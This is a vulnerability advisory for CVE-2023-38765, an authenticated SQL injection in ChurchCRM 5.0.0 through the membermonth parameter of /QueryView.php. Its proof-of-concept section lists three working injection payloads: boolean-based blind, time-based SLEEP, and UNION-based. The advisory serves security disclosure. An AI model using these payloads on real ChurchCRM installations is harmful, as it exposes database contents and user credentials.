# CVE-2023-38765 - SQL Injection in /QueryView.php?QueryID=22

|                 |                                                                                      |
| --------------- | --------------- |
| Researchers     | Rowan Crowley                                                               |
| Severity        | TBD                                   |
| Published       | TBD         |
| Software Link   | https://github.com/ChurchCRM/CRM             |

## Description
A SQL injection vulnerability in ChurchCRM v.5.0.0 allows a remote attacker to obtain sensitive database information via the membermonth parameter within the /QueryView.php endpoint. An authenticated attacker can use injection to perform arbitrary SQL queries via POST request with the membermonth parameter at the /QueryView.php?QueryID=22 endpoint (Membership Anniversaries query). This can be used for information disclosure of anything in the database, including user credentials.

## Proof of Concept
    Parameter: membermonth (POST)
        Type: boolean-based blind
        Title: Boolean-based blind - Parameter replace (original value)
        Payload: membermonth=(SELECT (CASE WHEN (9048=9048) THEN 1 ELSE (SELECT 5187 UNION SELECT 4662) END))&Submit=Execute Query
    
        Type: time-based blind
        Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
        Payload: membermonth=1 AND (SELECT 2544 FROM (SELECT(SLEEP(5)))NLQe)&Submit=Execute Query
    
        Type: UNION query
        Title: Generic UNION query (NULL) - 4 columns
        Payload: membermonth=1 UNION ALL SELECT NULL,NULL,NULL,CONCAT(0x716b717171,0x5543564b6c466177735358746f66735850675a7a566b564b52585173474e6b657a596c5152626d41,0x717a787871)-- -&Submit=Execute Query
